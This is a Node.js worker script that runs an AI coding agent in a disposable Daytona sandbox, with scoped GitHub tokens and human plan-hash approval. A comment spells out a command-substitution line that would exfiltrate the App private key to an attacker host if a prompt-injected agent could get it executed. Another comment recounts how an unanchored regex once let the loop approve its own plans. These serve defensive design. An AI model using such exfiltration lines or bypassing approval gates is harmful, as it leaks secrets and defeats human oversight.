#!/usr/bin/env node
// nanobots:engine-owned v0.2 — re-rendered by `nanobots update`
//
// Claims one approved Ready item and builds it inside a disposable Daytona sandbox.
// Called by `.nanobots/run-cycle.sh worker` — not meant to be invoked directly, though
// `node .nanobots/daytona-worker.mjs` works the same way if you want to run it by hand.
//
// Env:
//   GH_TOKEN          classic PAT, scopes project+repo+read:org, human account (same one the
//                      outer loop uses). Controller-side; also the sandbox credential
//                      ONLY when no GitHub App is configured (documented fallback).
//   DAYTONA_API_KEY   controller-side only; never enters the sandbox
//   NANOBOTS_GITHUB_APP_ID / _INSTALLATION_ID / _PRIVATE_KEY
//                     optional but recommended. When all three are set, the sandbox gets a
//                     per-run, repo-scoped installation token instead of the PAT — see
//                     .nanobots/RUNTIMES.md "GitHub App credentials". Controller-side only:
//                     the private key must NEVER be readable from inside the sandbox.
//   NANOBOTS_GITHUB_APP_WORKFLOWS=true
//                     opt-in; adds `workflows: write` for tasks that edit .github/workflows.
//                     Requires an org owner to grant it on the installation FIRST — otherwise
//                     every mint fails and every run stalls.
//   One model credential (see .nanobots/RUNTIMES.md "Swapping the brain")
//
// ASSUMPTIONS ON THE DAYTONA REST API: this script calls the endpoints documented at
// https://www.daytona.io/docs/en/typescript-sdk/ as of this template's authoring. Daytona's
// API surface can move faster than this file does. Run `npx nanobots-sh verify daytona`
// after wiring your key and before enabling the worker cron — if that proof fails on a
// request shape, the fix belongs in daytonaApi()/createSandbox()/execInSandbox() below,
// nowhere else in this file needs to change.
//
// See .nanobots/RUNTIMES.md "Security model" for what does and doesn't enter the sandbox,
// and why the sandbox — not a separate relay — holds the GitHub token for this one run.

import { execSync } from 'node:child_process';
import { existsSync, readFileSync } from 'node:fs';
import { randomUUID } from 'node:crypto';
import { createSandbox as daytonaCreateSandbox, execInSandbox as daytonaExecInSandbox, deleteSandbox as daytonaDeleteSandbox, redact } from './daytona-client.mjs';
import { readAppConfig, createTokenSession, assertNoTokenInGitConfig } from './github-app-auth.mjs';

const c = {
  cyan: (s) => `\x1b[1;36m${s}\x1b[0m`,
  yellow: (s) => `\x1b[1;33m${s}\x1b[0m`,
};
const say = (m) => console.log(`${c.cyan('[daytona-worker]')} ${m}`);
const warn = (m) => console.log(`${c.yellow('[daytona-worker]')} ${m}`);
const die = (m) => { console.error(`${c.yellow('[daytona-worker]')} ${m}`); process.exit(1); };

function sh(cmd, opts = {}) {
  return execSync(cmd, { encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'], ...opts }).trim();
}
function shTry(cmd, opts = {}) {
  try { return sh(cmd, opts); } catch { return null; }
}
// Untrusted content (anything derived from sandbox output) MUST go via stdin, never
// interpolated into a command string. JSON.stringify emits DOUBLE quotes, and the shell
// expands backticks and $( ) inside those — so a prompt-injected agent could put
// $(curl attacker/?k=$NANOBOTS_GITHUB_APP_PRIVATE_KEY) in its output and have the CONTROLLER
// run it. The controller holds DAYTONA_API_KEY and the App private key; the sandbox must
// never be able to reach them.
function shStdin(cmd, input) { return execSync(cmd, { encoding: 'utf8', input }); }
function shStdinTry(cmd, input) { try { return shStdin(cmd, input); } catch { return null; } }

function shJson(cmd) {
  return JSON.parse(sh(cmd));
}

// ── config & env ─────────────────────────────────────────────────────────────

if (!existsSync('.nanobots/config.json')) die('no .nanobots/config.json — run from the repo root');
const cfg = JSON.parse(readFileSync('.nanobots/config.json', 'utf8'));
const NWO = `${cfg.owner}/${cfg.repo}`;
const daytona = cfg.daytona ?? {};
const approvalRequired = cfg.approval?.requireVersionedStart !== false;

const DAYTONA_API_KEY = process.env.DAYTONA_API_KEY;
if (!DAYTONA_API_KEY) die('DAYTONA_API_KEY not set — see .nanobots/RUNTIMES.md');
if (!process.env.GH_TOKEN) die('GH_TOKEN not set — see .nanobots/RUNTIMES.md');

// Sandbox credential: a per-run GitHub App installation token when the App is configured,
// otherwise the controller's PAT (documented fallback). The App path is strictly better —
// it is repo-scoped, expires, is revoked at the end of the run, and carries no
// `pull_requests` permission, so the sandbox cannot open/modify/merge a PR.
// See .nanobots/RUNTIMES.md "GitHub App credentials".
const APP = readAppConfig(process.env);
if (APP.partial) {
  // Half-configured must never half-enable the path — but say so loudly, or the operator
  // believes the App is live while the PAT is silently doing the work.
  warn(`GitHub App partially configured (missing: ${APP.missing.join(', ')}) — treating as UNCONFIGURED and falling back to GH_TOKEN.`);
}
// A custom engine brings its own credential, so the Claude-specific check only applies to the
// default engine. Billing is the credential you supply, never a mode: CLAUDE_CODE_OAUTH_TOKEN
// is a subscription, ANTHROPIC_API_KEY is metered, and another provider's key is another
// engine entirely. See RUNTIMES.md "Worker engine is swappable".
const WORKER_CMD = process.env.NANOBOTS_WORKER_CMD || '';
const MODEL_CREDS = ['CLAUDE_CODE_OAUTH_TOKEN', 'ANTHROPIC_API_KEY', 'ANTHROPIC_AUTH_TOKEN']
  .filter((k) => process.env[k]);
if (!WORKER_CMD && MODEL_CREDS.length === 0) {
  die('need CLAUDE_CODE_OAUTH_TOKEN, ANTHROPIC_API_KEY, or ANTHROPIC_AUTH_TOKEN (or set NANOBOTS_WORKER_CMD to use a different engine)');
}
// Extra credentials a custom engine needs, named in NANOBOTS_WORKER_ENV (comma-separated).
// An explicit allowlist, not a blanket forward: the sandbox must never inherit the
// controller's whole environment — DAYTONA_API_KEY and the App private key live there.
const EXTRA_ENV = (process.env.NANOBOTS_WORKER_ENV || '')
  .split(',').map((s) => s.trim()).filter(Boolean);
const FORBIDDEN_FORWARD = new Set([
  'DAYTONA_API_KEY', 'NANOBOTS_GITHUB_APP_PRIVATE_KEY', 'NANOBOTS_GITHUB_APP_ID',
  'NANOBOTS_GITHUB_APP_INSTALLATION_ID',
]);
for (const k of EXTRA_ENV) {
  if (FORBIDDEN_FORWARD.has(k)) die(`refusing to forward ${k} into the sandbox — it is controller-only (see RUNTIMES.md "Security model")`);
}
const MODEL_ENV = Object.fromEntries(
  [...MODEL_CREDS, 'ANTHROPIC_BASE_URL', 'ANTHROPIC_MODEL', 'ANTHROPIC_SMALL_FAST_MODEL',
    ...(WORKER_CMD ? ['NANOBOTS_WORKER_CMD'] : []), ...EXTRA_ENV]
    .filter((k) => process.env[k])
    .map((k) => [k, process.env[k]]),
);

const RUN_ID = randomUUID();

// ── GitHub board helpers (same conventions as .nanobots/RUNTIMES.md) ───────────

function findProject() {
  const list = shJson(`gh project list --owner ${cfg.owner} --format json --limit 100`);
  const project = list.projects?.find((p) => p.title === cfg.board);
  if (!project) die(`board "${cfg.board}" not found under ${cfg.owner} — run \`nanobots init\` first`);
  return project;
}

function findStatusField(project) {
  const fields = shJson(`gh project field-list ${project.number} --owner ${cfg.owner} --format json --limit 30`);
  const status = fields.fields.find((f) => f.name === 'Status');
  if (!status) die('Status field not found on the board');
  const options = Object.fromEntries((status.options ?? []).map((o) => [o.name, o.id]));
  return { id: status.id, options, projectId: project.id };
}

function countInProgress(projectNumber) {
  const items = shJson(`gh project item-list ${projectNumber} --owner ${cfg.owner} -L 200 --format json --query 'status:"In Progress"'`);
  return (items.items ?? []).length;
}

// Ready items, best candidate first (Priority then smallest Size — same order the outer
// loop dispatches in). gh's item-list JSON shape has moved across versions; if this
// throws, inspect `gh project item-list <n> --owner <o> --format json | jq` and adjust.
function listReadyCandidates(projectNumber) {
  const items = shJson(`gh project item-list ${projectNumber} --owner ${cfg.owner} -L 200 --format json --query 'status:"Ready"'`);
  const sizeRank = { S: 0, M: 1, L: 2, XL: 3 };
  const prioRank = { P0: 0, P1: 1, P2: 2, P3: 3 };
  return (items.items ?? [])
    .map((it) => ({
      itemId: it.id,
      number: it.content?.number,
      priority: it.priority ?? it.Priority ?? 'P3',
      size: it.size ?? it.Size ?? 'M',
    }))
    .filter((it) => it.number)
    .sort((a, b) => (prioRank[a.priority] ?? 9) - (prioRank[b.priority] ?? 9)
      || (sizeRank[a.size] ?? 9) - (sizeRank[b.size] ?? 9));
}

function issueLabels(number) {
  const issue = shJson(`gh issue view ${number} --repo ${NWO} --json labels`);
  return (issue.labels ?? []).map((l) => l.name);
}

// Plan-hash approval: LOOP-PROMPT.md posts a `Plan ready` comment ending with
// `<!-- nanobots:plan issue=N hash=<12-hex> -->`; a collaborator approves with
// `/nanobots start <hash>` in a later comment. Both must reference the SAME, latest hash.
function checkApproval(number) {
  if (!approvalRequired) return { approved: true };
  const comments = shJson(`gh issue view ${number} --repo ${NWO} --json comments --jq '.comments'`);
  let planHash = null;
  let planIndex = -1;
  comments.forEach((cmt, i) => {
    const m = cmt.body?.match(/<!--\s*nanobots:plan\s+issue=\d+\s+hash=([0-9a-f]{12})\s*-->/);
    if (m) { planHash = m[1]; planIndex = i; }
  });
  if (!planHash) return { approved: false, reason: 'no versioned plan posted yet' };
  for (let i = comments.length - 1; i > planIndex; i--) {
    // ANCHORED TO A WHOLE LINE, deliberately. An unanchored match reads the command out of
    // ordinary prose — including the loop's own plan comment, which tells the human "approve
    // with `/nanobots start <hash>`". That made the loop self-approve every item it planned
    // (it posts via PROJECTS_PAT, a collaborator), turning the human gate into decoration.
    // Requiring the command to be alone on its line means a backticked mention inside a
    // sentence cannot approve anything, while a human can still add commentary on other lines.
    const m = comments[i].body?.match(/^[ \t]*\/nanobots start ([0-9a-f]{12})[ \t]*$/m);
    if (m && m[1] === planHash) {
      const login = comments[i].author?.login;
      const perm = shTry(`gh api repos/${NWO}/collaborators/${login}/permission --jq .permission`);
      if (perm && ['admin', 'write', 'maintain'].includes(perm)) {
        return { approved: true, approver: login, hash: planHash };
      }
    }
  }
  return { approved: false, reason: `no valid /nanobots start ${planHash} from a collaborator yet` };
}

// Opens the PR for a branch the sandbox pushed, using the CONTROLLER's PR-capable credential.
// Identifies the branch by the convention the worker prompt mandates (nanobots/<issue>-*) and
// verifies it against the API rather than trusting anything the sandbox reported.
function openPullRequest(number, projectNumber, statusField) {
  const refs = shTry(`gh api repos/${NWO}/git/matching-refs/heads/nanobots/${number}- --jq '[.[].ref]'`);
  // An empty list is a valid 200 response — `if (refs)` would read "[]" as success.
  let branches = [];
  try { branches = JSON.parse(refs || '[]'); } catch { branches = []; }
  if (!Array.isArray(branches) || branches.length === 0) {
    warn(`no nanobots/${number}-* branch was pushed — nothing to open a PR for.`);
    return null;
  }
  // Most recently created ref wins if the worker retried within a run.
  const branch = branches[branches.length - 1].replace(/^refs\/heads\//, '');

  // Never trust a reported PR number: ask GitHub whether one already exists for this head.
  const existing = shTry(`gh pr list --repo ${NWO} --head ${branch} --state open --json number --jq '.[0].number // empty'`);
  if (existing) {
    say(`PR #${existing} already open for ${branch}.`);
    return existing;
  }

  const body = `Closes #${number}\n\nBuilt by a nanobot worker in a disposable Daytona sandbox (run \`${RUN_ID.slice(0, 8)}\`).\n`
    + `The sandbox pushed \`${branch}\`; this PR was opened by the controller, because the sandbox's\n`
    + `per-run token deliberately carries no \`pull_requests\` permission.\n\n`
    + `Gates and the required OCR review run on this PR head — see the checks below.`;
  const title = shTry(`gh api repos/${NWO}/commits/${branch} --jq .commit.message`)?.split('\n')[0]
    ?? `nanobots: resolve #${number}`;

  const url = shStdinTry(
    `gh pr create --repo ${NWO} --base ${cfg.defaultBranch} --head ${branch} --title ${JSON.stringify(title)} --body-file - --label nanobots:built`,
    body,
  );
  if (!url) { warn(`failed to open a PR for ${branch} — the branch is pushed; open it by hand.`); return null; }
  const prNumber = String(url).trim().split('/').pop();
  say(`opened PR #${prNumber} for ${branch}`);

  // Hand the item to the review stage the outer loop watches.
  const item = shJson(`gh project item-list ${projectNumber} --owner ${cfg.owner} -L 200 --format json --query 'status:"In Progress"'`)
    .items.find((it) => it.content?.number === number);
  if (item && statusField.options['In Review']) {
    shTry(`gh project item-edit --project-id ${statusField.projectId} --id ${item.id} --field-id ${statusField.id} --single-select-option-id ${statusField.options['In Review']}`);
    say('board: In Progress → In Review');
  }
  return prNumber;
}

function claim(number, projectNumber, statusField) {
  const item = shJson(`gh project item-list ${projectNumber} --owner ${cfg.owner} -L 200 --format json --query 'status:"Ready"'`)
    .items.find((it) => it.content?.number === number);
  if (!item) return false;
  const claimNote = `<!-- nanobots:run issue=${number} run=${RUN_ID} attempt=1 -->\n🤖 daytona-worker claimed this item (run \`${RUN_ID.slice(0, 8)}\`) — building in an isolated Daytona sandbox.`;
  shStdin(`gh issue comment ${number} --repo ${NWO} --body-file -`, claimNote);
  sh(`gh project item-edit --project-id ${statusField.projectId} --id ${item.id} --field-id ${statusField.id} --single-select-option-id ${statusField.options['In Progress']}`);
  // Re-read: confirm our claim comment is still the most recent run marker (single-flight, best effort).
  const latest = shJson(`gh issue view ${number} --repo ${NWO} --json comments --jq '.comments'`)
    .filter((cmt) => /nanobots:run issue=\d+ run=/.test(cmt.body ?? ''))
    .pop();
  const ourRun = latest?.body?.includes(RUN_ID);
  if (!ourRun) { warn(`lost the claim race on #${number} — backing off`); return false; }
  return true;
}

// ── Daytona sandbox lifecycle (shared helpers in daytona-client.mjs) ───────────

async function createSandbox(number) {
  const labels = { owner: cfg.owner, repo: cfg.repo, issue: String(number), run: RUN_ID };
  say(`creating sandbox for #${number} (snapshot=${daytona.snapshot || 'provider default'}, target=${daytona.target || 'us'})...`);
  return daytonaCreateSandbox(DAYTONA_API_KEY, {
    labels,
    snapshot: daytona.snapshot,
    target: daytona.target,
    autoDeleteInterval: daytona.autoDeleteMinutes ?? 60,
  });
}

async function execInSandbox(sandboxId, command, opts = {}) {
  return daytonaExecInSandbox(DAYTONA_API_KEY, sandboxId, command, opts);
}

async function deleteSandbox(sandboxId) {
  if (!sandboxId) return;
  const ok = await daytonaDeleteSandbox(DAYTONA_API_KEY, sandboxId, { onWarn: warn });
  if (ok) say(`sandbox ${sandboxId} deleted.`);
}

// ── main ─────────────────────────────────────────────────────────────────────

async function main() {
  const project = findProject();
  const statusField = findStatusField(project);

  const inProgress = countInProgress(project.number);
  if (inProgress >= (cfg.wipCap ?? 2)) {
    say(`WIP cap reached (${inProgress}/${cfg.wipCap}) — nothing to claim this run.`);
    return;
  }

  const candidates = listReadyCandidates(project.number);
  let target = null;
  for (const cand of candidates) {
    const labels = issueLabels(cand.number);
    if (labels.includes(cfg.humanLabel)) continue;
    const approval = checkApproval(cand.number);
    if (!approval.approved) {
      say(`#${cand.number} not claimable yet: ${approval.reason}`);
      continue;
    }
    target = { ...cand, approval };
    break;
  }
  if (!target) { say('no claimable Ready item this run.'); return; }

  say(`claiming #${target.number} (run ${RUN_ID})...`);
  if (!claim(target.number, project.number, statusField)) return;

  let sandboxId;
  // One session per run. Every token it issues is tracked so all of them are revoked on the
  // way out — including any minted by a mid-run refresh, not just the first.
  const session = APP.configured ? createTokenSession(APP, cfg.repo) : null;
  try {
    sandboxId = await createSandbox(target.number);

    for (const step of daytona.databaseBootstrap ?? []) {
      say(`db bootstrap: ${step}`);
      const r = await execInSandbox(sandboxId, step, { timeout: 300 });
      if (r.exitCode !== 0) throw new Error(`database bootstrap step failed: ${step}`);
    }

    say(session ? 'minting a per-run, repo-scoped installation token...' : 'using the controller PAT as the sandbox credential (no GitHub App configured)...');
    const cloneToken = session ? await session.token() : process.env.GH_TOKEN;

    say('cloning repository into sandbox...');
    // `--no-tags` and a credential inline in the URL: git does NOT persist an inline
    // credential to .git/config, but we verify rather than trust — see the assert below.
    // Authenticate through a credential helper that reads the token from the ENVIRONMENT at
    // use time, never from a URL. Embedding it as https://x-access-token:TOKEN@github.com/...
    // writes the whole credential into .git/config as remote.origin.url — verified, not
    // assumed: the leak assertion below caught exactly that in production. It matters because
    // the worker then runs arbitrary build and test commands (npm install and friends) which
    // can read .git/config and exfiltrate the token.
    //
    // The helper script itself contains no secret — only the NAME of an env var — so writing
    // it to the sandbox's global gitconfig is safe. GH_TOKEN is supplied per command below.
    const helper = `git config --global credential.helper '!f() { echo username=x-access-token; echo "password=$GH_TOKEN"; }; f'`;
    const helperRes = await execInSandbox(sandboxId, helper, { timeout: 60 });
    if (helperRes.exitCode !== 0) throw new Error('failed to configure the git credential helper');

    const cloneCmd = `git clone --branch ${cfg.defaultBranch} https://github.com/${NWO}.git repo`;
    const clone = await execInSandbox(sandboxId, cloneCmd, { timeout: 300, env: { GH_TOKEN: cloneToken } });
    if (clone.exitCode !== 0) throw new Error('clone failed');

    // Assert the credential did not survive the clone. If it is sitting in .git/config, it
    // outlives the run inside a sandbox filesystem and the per-run scoping is decorative.
    const gitCfg = await execInSandbox(sandboxId, 'git config --local --list', { cwd: 'repo', timeout: 60 });
    assertNoTokenInGitConfig(gitCfg.result ?? '', cloneToken);

    // The sandbox image ships bash, git, node and claude, but NOT gh — and the worker prompt
    // is built entirely on gh: read the work-spec, comment on the issue, open the PR with
    // `Closes #N`. Without it the agent reads its brief, finds no way to act, and exits 0
    // having done nothing, which reads as a successful run. Install it before handing over.
    say('bootstrapping the sandbox toolchain (gh)...');
    const ghBootstrap = [
      'set -e',
      'command -v gh >/dev/null 2>&1 && exit 0',
      // Write the release JSON to a file rather than piping into grep: closing the pipe early
      // makes curl exit 23 and, under `set -e`, kills the bootstrap.
      'curl -fsSL -o /tmp/gh-release.json https://api.github.com/repos/cli/cli/releases/latest',
      `V=$(grep -m1 '"tag_name"' /tmp/gh-release.json | sed -E 's/.*"v?([^"]+)".*/\\1/')`,
      '[ -n "$V" ] || { echo "could not resolve a gh release" >&2; exit 1; }',
      'curl -fsSL -o /tmp/gh.tgz "https://github.com/cli/cli/releases/download/v$V/gh_${V}_linux_amd64.tar.gz"',
      'tar -xzf /tmp/gh.tgz -C /tmp',
      'mkdir -p "$HOME/.local/bin"',
      'cp "/tmp/gh_${V}_linux_amd64/bin/gh" "$HOME/.local/bin/gh"',
      '"$HOME/.local/bin/gh" --version | head -1',
    ].join('\n');
    const boot = await execInSandbox(sandboxId, ghBootstrap, { timeout: 300 });
    if (boot.exitCode !== 0) throw new Error(`sandbox toolchain bootstrap failed: ${redact(boot.result ?? '').slice(-500)}`);

    say('running the worker prompt inside the sandbox...');
    // Refresh before the long build: installation tokens last an hour and a build can run
    // longer, so the sandbox gets the newest token rather than one already partly spent.
    const buildToken = session ? await session.refresh() : process.env.GH_TOKEN;
    const build = await execInSandbox(sandboxId, 'bash .nanobots/run-cycle.sh worker-inline', {
      cwd: 'repo',
      timeout: 60 * 45,
      // Only the scoped token crosses into the sandbox. The App id/installation/private key
      // never do — a worker that could mint its own tokens would defeat the whole scheme.
      // THE ASSIGNMENT. Without these the sandboxed agent has no idea which item it is
      // working: the prompt refers to "the issue" and "your run ID" but nothing supplied
      // either, so it replied "What would you like me to do?" and exited 0 having done
      // nothing. The controller knows both — it just never passed them across.
      env: {
        GH_TOKEN: buildToken,
        PATH: '/root/.local/bin:/home/daytona/.local/bin:/usr/local/share/nvm/current/bin:/usr/local/bin:/usr/bin:/bin',
        NANOBOTS_ISSUE: String(target.number),
        NANOBOTS_RUN_ID: RUN_ID,
        NANOBOTS_REPO: NWO,
        ...MODEL_ENV,
      },
    });

    // The tail is SANDBOX OUTPUT — untrusted. Via stdin, never the command string.
    shStdin(
      `gh issue comment ${target.number} --repo ${NWO} --body-file -`,
      `<!-- nanobots:run issue=${target.number} run=${RUN_ID} attempt=1 state=done -->\n`
      + `🤖 sandbox run finished (exit ${build.exitCode}). Tail:\n\n\`\`\`\n${redact(build.result ?? '').slice(-3000)}\n\`\`\``,
    );
    if (build.exitCode !== 0) throw new Error(`worker exited ${build.exitCode} — see the issue comment for the sanitized tail`);

    // THE CONTROLLER OPENS THE PR — the sandbox cannot, by design. Its per-run token grants
    // contents:write and deliberately NOT pull_requests, so a worker that outlives its run
    // can push to a branch nobody watches and nothing more. RUNTIMES.md always said this
    // call "belongs in the controller"; until now nothing actually made it, so the worker
    // pushed a perfectly good branch and no PR ever appeared.
    openPullRequest(target.number, project.number, statusField);
  } catch (err) {
    warn(`run ${RUN_ID} for #${target.number} failed: ${err.message}`);
    // err.message can also carry sandbox output (exec failures embed the response body).
    shStdinTry(
      `gh issue comment ${target.number} --repo ${NWO} --body-file -`,
      `<!-- nanobots:run issue=${target.number} run=${RUN_ID} attempt=1 state=failed -->\n🤖 sandbox run failed: ${redact(err.message)}`,
    );
  } finally {
    // Revoke BEFORE the sandbox goes away, and on every exit path including failure/abort.
    // Revocation is eventually consistent (~2–7s observed): this narrows the window, it does
    // not close it. What actually contains a stray push is branch protection.
    if (session) {
      for (const r of await session.revokeAll()) {
        if (r.revoked) say(`installation token revoked (${r.status}).`);
        // 403 is NOT proof of revocation — GitHub returns it for rate limiting too.
        else warn(`installation token revocation FAILED: ${r.reason ?? r.status} — it may stay live until it expires.`);
      }
    }
    await deleteSandbox(sandboxId);
  }
}

await main();
